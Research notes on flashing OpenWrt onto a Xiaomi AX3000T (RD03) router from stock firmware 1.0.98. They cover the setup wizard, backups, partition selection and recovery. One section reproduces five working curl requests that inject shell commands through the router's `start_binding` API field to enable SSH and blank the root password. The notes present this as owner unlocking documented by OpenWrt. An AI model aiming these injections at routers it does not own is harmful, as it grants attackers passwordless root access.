# Research: Xiaomi AX3000T (RD03) — stock 1.0.98 → OpenWrt 25.12.5 via the API RCE method

Date: 2026-09-01. Scope: RD03 (CN, MT7981B, NAND), stock firmware 1.0.98 freshly TFTP-recovered, installing clean OpenWrt 25.12.5 with the documented `xqsystem/start_binding` API RCE. All claims cited inline; style per `docs/RESEARCH_AX3000T_FAILSAFE.md`.

## TL;DR

1. **Complete the initial setup wizard first** (wiki: "Perform initial router setup") — the `stok` token only exists after login. Factory state *does* serve HTTP (the setup page) at 192.168.31.1.
2. The stock system's IP is **192.168.31.1**, never .2 — 192.168.31.2 was the bootloader's TFTP-recovery address; an ARP answer at .2 is most plausibly the PC's **stale neighbor entry** from the recovery session.
3. Exploit = 5 curl POSTs to `http://192.168.31.1/cgi-bin/luci/;stok=<stok>/api/xqsystem/start_binding` injecting `\n`-separated shell (`nvram set ssh_en=1; nvram commit; sed dropbear→debug; dropbear start; passwd -d root`). Success is **verified by port 22 opening**, not by the JSON body (`{"code":0}` or `{"code":1541}` both reported).
4. Backup mtd1/2/3/4/5/8/12 (BL2, Nvram, Bdata, Factory, FIP, ubi, KF) with `nanddump`, then `cat /proc/cmdline`: **firmware=0 → ubiformat /dev/mtd9; firmware=1 → ubiformat /dev/mtd8**, plus the matching nvram flag block, reboot into initramfs (PC on DHCP, ssh root@192.168.1.1), then `sysupgrade -n` the squashfs image.
5. **25.12.5 supports every RD03 NAND/switch variant** (ESMT, Winbond W25N01KV, Foresee F35SQA001G, MT7531AE/AN8855); the wiki recommends "the latest 25.12 version" for exactly this reason.

## Q1. Initial setup requirement and the factory-state web UI

- The wiki's Windows exploit instructions open with "**Perform initial router setup.**" — mandatory, because the next step is "replace xxx in the commands below with the stockID, taken from the browser's command line after logging into 192.168.31.1". No login → no stok → no exploit. [1]
- alexq's RD03 flow: connect PC to the 2nd/3rd LAN port → "your pc will automatically receive an ip address from the router (DHCP-ish 192.168.31.x)… log in to 192.168.31.1, and perform the initial router configuration (DHCP, WiFi password, admin password)". [2] No internet connection is needed for the CN first-boot setup ("You don't need internet for the initial RD03 setup… when it asks - choose AP mode"). [3]
- What fresh stock serves: a **setup screen** (pre-wizard) or the **login screen** (post-wizard) — both over HTTP at 192.168.31.1 ("As soon as I connected it to that IP it either went to the login screen or the setup screen"). [4] So HTTP silence in factory state is *not* explained by an uncompleted wizard; the wizard page itself is served.
- After login the browser is redirected to `http://192.168.31.1/cgi-bin/luci/;stok=<stok>/web/home#router` — that `;stok=` value is the token. [5]

**Why ARP answered but HTTP/ICMP didn't** (operator's RD03, ≥2 reboots, one HTTP 200 ~30 min post-flash): the stock system binds the web UI on **192.168.31.1**; nothing in stock answers on .2. The .2 MAC reply (90:fb:5d:16:7a:40) matches the recovery-phase identity of the same LAN MAC — during TFTP recovery the bootloader held 192.168.31.2 [1] — so a **stale ARP/neigh cache entry on the laptop is the leading suspect** (analysis, not a sourced claim). Fixes: `ip neigh flush all`, probe `.1` (and re-DHCP the laptop), and treat the LED as ground truth: persistent orange blinking = still boot-looping (Q2/Q7); if the loop never settles, redo the TFTP recovery and **finish its final power-cycle step** (wiki: wait for blinking blue, then unplug/replug). [1]

## Q2. Expected IP, boot phases, LED

- Stock LAN IP after any flash: **192.168.31.1** (DHCP server on LAN hands out 192.168.31.x). [2] Appearing "at 192.168.31.2" is **not** the running system — that was the bootloader during recovery (DHCP pool 192.168.31.2 → file `C0A81F02.img`). [1]
- The wiki's recovery flow fixes the phases: while the recovery writes, LED "flashing orange (amber)" → "**Wait until the blue led starts flashing!**" (flash success) → "**unplug the router's power… plug it back in**". Solid white during recovery = image rejected, retry with another file. [1] First boot after that can take minutes and self-reboot (two observed reboots are consistent with community experience of repeated boot cycles; there is no fixed documented count) — keep waiting for the LED to settle **solid blue** (stock "running"), probing 192.168.31.1 periodically.
- OpenWrt phases (for later): orange blink ~5/s = boot/preinit, ~10/s = failsafe, solid blue = running [see RESEARCH_AX3000T_FAILSAFE.md Q2].

## Q3. Getting the `stok` token on 1.0.98

1. Browser → `http://192.168.31.1/` → run the setup wizard (set admin password). Router restarts. [6]
2. Log in with that password; the address bar becomes `http://192.168.31.1/cgi-bin/luci/;stok=<32-hex>/web/home#router`. [5][6] Copy `<stok>`.
3. URL format for all exploit calls: `http://192.168.31.1/cgi-bin/luci/;stok=<stok>/api/xqsystem/start_binding` (POST). [1]
- A stok is session-bound; if calls start failing, "rebooting router, obtain a new stock ID, and run the curl commands once again" (alexq). [7]

## Q4. The `xqsystem/start_binding` RCE on 1.0.98

Confirmed: the wiki API-support table lists **1.0.98 (CN) → `xqsystem/start_binding`** (image `miwifi_rd03_firmware_48abd_1.0.98.bin`); the next CN release, 1.0.106, needs a downgrade. [1] The five calls (wiki verbatim; replace `xxx` with stok) [1]:

```sh
curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=xxx/api/xqsystem/start_binding -d "uid=1234&key=1234'%0Anvram%20set%20ssh_en%3D1'"
curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=xxx/api/xqsystem/start_binding -d "uid=1234&key=1234'%0Anvram%20commit'"
curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=xxx/api/xqsystem/start_binding -d "uid=1234&key=1234'%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear'"
curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=xxx/api/xqsystem/start_binding -d "uid=1234&key=1234'%0A%2Fetc%2Finit.d%2Fdropbear%20start'"
curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=xxx/api/xqsystem/start_binding -d "uid=1234&key=1234'%0Apasswd%20-d%20root%0A'"
```

Then (wiki) [1]:

```sh
ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.31.1
```

Empty password (from `passwd -d root`); the `ssh-rsa` options are required because stock dropbear only offers the old ssh-rsa host-key algorithm, which modern OpenSSH refuses by default. [1]

**Known pitfalls (1.0.9x-era RD03):**

- Success responses differ by version: `{"code":0}` on older builds vs `{"code":1541}` reported as the success marker on recent stock ("when each curl request returns `{"code":1541}`, that's 90% of the work done"). [2][8] Either way, the **real test is port 22**: one user's five calls all returned `{"hw":"RD03","code":0}` yet `nmap -p22` showed `22/tcp closed`. [8]
- If SSH stays refused: try one extra call with `%0A/etc/init.d/dropbear%20restart` (alexq), [9] then "rebooting router, obtain a new stock ID, and run the curl commands once again" (alexq) [7] — i.e. re-login → fresh stok → full 5-call repeat. If that still fails, XMiR-Patcher (option 2) succeeded where manual curls failed on the same units. [8][10]
- A `301 Moved Permanently` from the API means the endpoint is gone from that build (seen on 1.0.103 INT which moved to the `xqsystem/get_icon` exploit) — not a stok problem. On 1.0.98 `start_binding` is still the documented API. [6][1]
- The `sed` rewrites the stock dropbear init's `channel=` to `"debug"` so dropbear actually listens on port 22; if you ever re-run setup/downgrade, the whole 5-call sequence must be redone. [1]

## Q5. Backup — nanddump commands and stock mtd numbering

Wiki backup step (run over the SSH session above) [1]:

```sh
nanddump -f /tmp/BL2.bin /dev/mtd1
nanddump -f /tmp/Nvram.bin /dev/mtd2
nanddump -f /tmp/Bdata.bin /dev/mtd3
nanddump -f /tmp/Factory.bin /dev/mtd4
nanddump -f /tmp/FIP.bin /dev/mtd5
nanddump -f /tmp/ubi.bin /dev/mtd8
nanddump -f /tmp/KF.bin /dev/mtd12
```

Stock 1.0.x `/proc/mtd` (real XiaoQiang dump; matches the wiki numbering exactly) [11]:

```
mtd0: 08000000 "spi0.0"   mtd5: 00200000 "FIP"       mtd10: 02000000 "overlay"
mtd1: 00100000 "BL2"      mtd6: 00040000 "crash"     mtd11: 00c00000 "data"
mtd2: 00040000 "Nvram"    mtd7: 00040000 "crash_log" mtd12: 00040000 "KF"
mtd3: 00040000 "Bdata"    mtd8: 02200000 "ubi"
mtd4: 00200000 "Factory"  mtd9: 02200000 "ubi1"
```

- `cat /proc/cmdline` decides the flashing target: `…rootfstype=squashfs firmware=0 mtd=ubi` = running from mtd8, so the inactive **mtd9 (ubi1)** gets the new image; `firmware=1 … mtd=ubi1` = running from mtd9 → **mtd8** is the target. [11][1][12] alexq: "You detected `firmware=0`, which means `mtd8` (`ubi0`) was the active partition on stock firmware, and then you flashed OpenWrt's `initramfs-factory.ubi` to the inactive `mtd9` (`ubi1`) partition." [12]
- Always re-check names via `cat /proc/mtd` before trusting numbers — after OpenWrt is installed the numbering *changes* (OpenWrt lists `mtd0: BL2 … mtd7: KF, mtd8: ubi_kernel, mtd9: ubi`, and ubootmod merges to a single `mtd8: ubi`). [12][13]
- Transfer off-box: Linux `netcat -lp 1234 | tar xvf -` + `cd /tmp && tar cf - *.bin | nc 192.168.31.<pc> 1234`; Windows `scp -O -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no root@192.168.31.1:/tmp/*.bin C:/AX3000T_Backup/`. [1]

## Q6. Flash commands for 25.12.x and boot into initramfs

1. Upload `openwrt-25.12.5-mediatek-filogic-xiaomi_mi-router-ax3000t-initramfs-factory.ubi` to `/tmp` (scp) and `cat /proc/cmdline`. [1]
2. **firmware=0** (wiki verbatim) [1]:
   ```sh
   ubiformat /dev/mtd9 -y -f /tmp/*mediatek-filogic-xiaomi_mi-router-ax3000t-initramfs-factory.ubi
   nvram set boot_wait=on
   nvram set uart_en=1
   nvram set flag_boot_rootfs=1
   nvram set flag_last_success=1
   nvram set flag_boot_success=1
   nvram set flag_try_sys1_failed=0
   nvram set flag_try_sys2_failed=0
   nvram commit
   reboot
   ```
   **firmware=1**: `ubiformat /dev/mtd8 -y -f /tmp/…initramfs-factory.ubi` and flags `flag_boot_rootfs=0`, `flag_last_success=0` (rest identical). [1]
3. Initramfs boot: cable in a **middle/LAN** port (not WAN), "**configure the computer's network to use DHCP. You can use wireshark if things don't work. This command will connect you to the OpenWrt system: `ssh root@192.168.1.1`**" — the initramfs runs a DHCP server on br-lan, so DHCP is the documented way; a static 192.168.1.2/24 also sits in the same subnet and works in practice, but DHCP is what the wiki documents. [1]
4. Copy `openwrt-25.12.5-…-squashfs-sysupgrade.bin` to `/tmp` and: `sysupgrade -n /tmp/*mediatek-filogic-xiaomi_mi-router-ax3000t-squashfs-sysupgrade.bin` — this installs OpenWrt's own single-ubi layout regardless of the stock firmware=0/1 slot used. [1][12]
- **25.12.5/RD03 variant warnings — none blocking**: ESMT F50L1G41LB (23.05.4+), Winbond W25N01KV (24.10.0-rc1+; bugfix 24.10.1+, PR #17898), Foresee F35SQA001G (24.10.0-rc3+; bugfix 24.10.3+, PR #17963), switch AN8855 (24.10.0-rc7+). Wiki: "To ensure compatibility with all existing AX3000T hardware types, the latest 25.12 version of OpenWrt is recommended." [1] Identify your chip post-install: `dmesg | grep nand` (ESMT may report as "GigaDevice"). [14]
- Use the **stock-layout images** (`…ax3000t-initramfs-factory.ubi` / `…squashfs-sysupgrade.bin`); "Do not use `ubootmod` images!" — the ubootmod path is a separate, optional bootloader replacement performed *after* a working OpenWrt install. [15][1]
- The old "config reset after 6 reboots" stock-bootloader bug is fixed since 24.10.0 (PR #17580) — 25.12.5 is not affected. [1][16]

## Q7. Known "half-dead after TFTP recovery" reports

- Wiki recovery itself documents failure LED states: image rejected → **solid white** (retry with another file); success = blinking blue, then power-cycle. Skipping that final power-cycle or interrupting the write leaves the unit boot-cycling. [1]
- TFTP file-name trap: the bootloader requests the **hex of whatever DHCP IP it was given** — with a dnsmasq pool of 192.168.31.2–254 one router got .23 and asked for `C0A81F17.img`; pin the pool/lease or watch the TFTP log and rename. [17][1]
- Stock behaving half-dead after restore is reported but symptom sets vary: "after a reboot, it might boot up and become inaccessible for no apparent reason. I restored it three times using TFTP" (thread 212425); solid-white/no-access after flashing was resolved by TFTP re-flash + retry. [18][17] **No 1.0.98-specific ARP-ok/HTTP-dead report was found**; for the operator's unit the stale-ARP + boot-cycle explanation (Q1) plus LED-watching is the actionable path, and re-running the TFTP recovery (end-to-end, including the final power-cycle) is the community-standard remedy. [1]

## Conflicts / caveats

- Success JSON differs across stock builds (`{"code":0}` vs `{"code":1541}`) [2][8] — do not gate on it; gate on port 22.
- The wiki's fixed nanddump mtd numbers match stock [11] but **not** OpenWrt layouts (BL2=mtd0 there) [12][13] — numbers are only valid while stock is running.
- 192.168.31.2 ARP-vs-HTTP behavior is my analysis from cited facts (recovery IP, stock IP, LED phases), not a sourced report. [1][2]

## Sources

1. OpenWrt Wiki: Xiaomi AX3000T — install, API RCE table, TFTP recovery (Wayback 2026-08-13) — https://openwrt.org/toh/xiaomi/ax3000t
2. Forum 180490 #3600 (alexq: setup flow, DHCP, `{"code":1541}`) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3600
3. Forum 180490 #3637 (alexq: no internet needed for RD03 setup) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3637
4. Forum 180490 #3656 (ehn: "login screen or the setup screen") — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3656
5. Forum 180490 #3638 (ehn: post-login URL with `;stok=`) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3638
6. Forum 180490 #3887 (tot-to: wizard → login → stok from address bar; 301 on 1.0.103) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3887
7. Forum 180490 #3649 (alexq: reboot + new stok + repeat curls) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3649
8. Forum 180490 #3656 transcript (5× `{"code":0}`, port 22 closed; patcher worked) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3656
9. Forum 180490 #3648 (alexq: dropbear restart curl) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3648
10. XMiR-Patcher (automation: run.sh → option 2) — https://github.com/openwrt-xiaomi/xmir-patcher
11. 4PDA AX3000T thread (stock XiaoQiang `/proc/mtd` + `/proc/cmdline` dump) — https://4pda.to/forum/index.php?showtopic=1074874&st=200
12. Forum 180490 #3919 (alexq: firmware=0 → mtd8 active/mtd9 target; layout comparisons) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3919
13. Forum 180490 #3918 (Panji: OpenWrt stock-bootloader layout mtd8=ubi_kernel/mtd9=ubi) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3918
14. Forum 180490 #1424 (alexq: `dmesg | grep nand` / switch detection) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/1424
15. Forum 180490 OP (remittor: "Do not use ubootmod images!") — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490
16. PR #17580 (6-reboot config-reset fix, since 24.10.0) — https://github.com/openwrt/openwrt/pull/17580
17. Forum 180490 #1066 (DHCP pool → `C0A81F17.img`; white-LED no-access) — https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/1066
18. Forum: "Xiaomi AX3000T Bricked (no rapid blink)" (repeated TFTP restores) — https://forum.openwrt.org/t/xiaomi-ax3000t-bricked-no-rapid-blink/212425
